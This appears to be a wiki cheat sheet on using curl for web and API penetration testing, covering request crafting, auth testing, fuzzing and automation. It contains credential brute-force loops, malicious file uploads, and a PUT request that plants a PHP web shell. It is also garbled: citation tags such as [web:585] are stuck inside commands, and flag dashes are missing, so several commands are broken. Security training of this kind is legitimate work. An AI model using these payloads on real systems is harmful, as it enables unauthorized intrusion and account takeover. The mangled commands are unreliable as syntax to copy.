---
icon: bracket-curly
---

# Curl

## The curl Masterclass: Professional Web and API Security Testing & Automation

cURL is the essential command-line tool for web and API interaction—loved by bug bounty hunters, penetration testers, and developers for its flexibility, scriptability, and protocol support. Its versatility spans reconnaissance, authentication, vulnerability testing, content manipulation, and workflow automation.

***

### I. Core Capabilities & Workflow

* **Protocol Agility:** Supports HTTP, HTTPS, FTP/S, SCP, SFTP, SMTP/S, TELNET, TFTP, GOPHER, and more, enabling broad network testing.\[1]\[2]\[3]
* **Advanced HTTP Requests:** Executes GET, POST, PUT, PATCH, DELETE, TRACE, OPTIONS, and custom verbs for REST API manipulation or server-side method abuse.\[2]\[4]\[1]
* **Request Modification:** Add custom headers, manipulate cookies, set referrers, user-agents, or host headers for testing authentication, CORS, and WAFs.\[4]\[1]\[2]
* **Authentication Testing:** Supports Basic, Digest, NTLM, Bearer, and custom tokens for HTTP/REST auth assessment.\[1]\[2]
* **File Uploads & Downloads:** Upload with `F` or `-data-binary`, test insecure file validation or remote file inclusion.\[4]\[1]
* **SSL/TLS & Proxy:** Test HTTPS endpoints (bypass certificate errors with `k`), support HTTP/SOCKS proxies for interception and advanced workflows.\[2]\[1]\[4]
* **Response Analysis:** Output headers only, follow redirects, analyze status and security headers for misconfigurations and vulnerabilities.\[1]\[4]
* **Automation & Scripting:** Integrates into bash, Python, or SOC/CI pipelines for large-scale automated testing.\[5]\[6]\[1]

***

### II. Professional Usage Examples

#### Request & Auth Testing

```bash
# GET request with custom headers
curl -i -H "Accept: application/json" -H "Authorization: Bearer $TOKEN" <https://target.com/api>

# POST json payload with authentication
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"1234"}' <https://target.com/login>

# Basic HTTP authentication
curl -u admin:password <https://target.com/admin>

# Brute-force via script
for user in $(cat users.txt); do for pass in $(cat passwords.txt); do curl -u "$user:$pass" <https://target.com/login>; done; done[web:585].

# Test with proxies
curl -x <http://127.0.0.1:8080> <https://target.com>

```

#### Vulnerability & Attack Simulation

```bash
# File upload test
curl -F "file=@evil.php.jpg" <https://target.com/upload[web:585][web:588]>.

# HTTP method abuse
curl -X PUT -d '<?php system($_GET["cmd"]); ?>' <https://target.com/shell.php[web:585][web:588]>.

# HTTP TRACE method
curl -X TRACE <https://target.com> -v

# SSRF and Host header injection
curl -H "Host: internal.target" <https://target.com/api>

# Fuzz/query parameter probing (with wordlist/script)
for param in $(cat paramlist.txt); do curl "$TARGET_URL?$param=test"; done

```

#### Response & Analysis

```bash
# Get response headers only
curl -I <https://target.com>

# Follow redirection and ignore SSL errors
curl -kL <https://target.com>

# Verbose request/response for debugging
curl -v <https://target.com>

# Save entire response for offline analysis
curl <https://target.com> -o output.html

```

***

### III. Advanced Automation & Scenarios

* **Integrate with Intermediaries:** Route through Burp Suite or ZAP for traffic interception, replay, or manual fuzzing.\[2]
* **Scripting Chains:** Combine cURL with grep/sed/awk/jq for custom parsing, automation, or batch exploitation.\[6]\[7]
* **API Testing:** Include in CI pipelines for auth, functionality, and injection flaw detection on REST interfaces.\[8]\[9]
* **Monitor Security Headers:** Automate checks for HSTS, CSP, and missing protections.
* **Recon Integration:** Use in asset enumeration, subdomain scanning (with HTTP checks), or content discovery.

***

### IV. Real-World Workflow Example

1. **Enumerate Vulnerable Endpoints**

```bash
for url in $(cat endpoints.txt); do curl -k -I $url; done

```

1. **Automate Brute-Force or Fuzzing**

```bash
for user in $(cat users.txt); do for pass in $(cat passwords.txt); do curl -u "$user:$pass" <https://target.com/login>; done; done

```

1. **Auth, Upload, and Proxy in Web App Pentesting**

```bash
curl -X POST -u admin:password -F "file=@exp.php" <https://target.com/upload> --proxy <http://127.0.0.1:8080>

```

1. **Security Header & Redirect Check**

```bash
curl -I -L <https://target.com> | grep -E 'Strict|CSP|Location'

```

1. **Trace and Log for Audit/Disclosure**

```bash
curl --trace-ascii curl.log <https://target.com>[web:585].

```

***

### V. Pro Tips & Best Practices

* Always operate with explicit authorization—log all potentially intrusive tests.\[6]\[1]
* Use `-trace-ascii` to keep request/response logs for forensics and bug bounty proof.
* Validate SSL/TLS errors only in context; don’t ignore real issues with `k` unless necessary.
* Integrate in pipelines for bug bounty and routine perimeter checks.
* Combine with other cli tools for mass testing (xargs, GNU Parallel, Python, etc.).
* Automate, but always analyze manual findings for maximum impact and accuracy.

***

This guide equips professionals to wield cURL for advanced security testing, automation, and continuous assessment—arming every pentester or bug bounty hunter with flexible, high-impact web and API reconnaissance.\[9]\[5]\[4]\[6]\[1]\[2]

Sources \[1] The Penetration Tester's Secret Weapon Against Web Security [https://lipsonthomas.com/mastering-curl-penetration-testing-tips/](https://lipsonthomas.com/mastering-curl-penetration-testing-tips/) \[2] 2023 Techniques: Mastering Curl for Pentesting Like a Pro! [https://ruatelo.com/curl-for-pentesting/](https://ruatelo.com/curl-for-pentesting/) \[3] curl - Tutorial [https://curl.se/docs/tutorial.html](https://curl.se/docs/tutorial.html) \[4] Web Penetration Testing with Curl Cheatsheet [https://www.hackingdream.net/2024/02/web-penetration-testing-with-curl-chaetsheet.html](https://www.hackingdream.net/2024/02/web-penetration-testing-with-curl-chaetsheet.html) \[5] curl Cheat Sheet: Helpful Commands and Exciting Hacks [https://www.stationx.net/curl-cheat-sheet/](https://www.stationx.net/curl-cheat-sheet/) \[6] 20+ cURL Hacks That Will Make You a Bug Bounty Pro [https://systemweakness.com/20-curl-hacks-that-will-make-you-a-bug-bounty-pro-186ecc51bff5](https://systemweakness.com/20-curl-hacks-that-will-make-you-a-bug-bounty-pro-186ecc51bff5) \[7] Extract — Grep — Curl | A $50000 Bug POC Methodology [https://infosecwriteups.com/extract-grep-curl-a-50000-bug-poc-methodology-16365489de92](https://infosecwriteups.com/extract-grep-curl-a-50000-bug-poc-methodology-16365489de92) \[8] How To Prepare for an API Pentest – Curl [https://blog.cyberadvisors.com/technical-blog/blog/how-to-prepare-for-an-api-pentest-curl](https://blog.cyberadvisors.com/technical-blog/blog/how-to-prepare-for-an-api-pentest-curl) \[9] Test a REST API with curl [https://www.baeldung.com/curl-rest](https://www.baeldung.com/curl-rest)
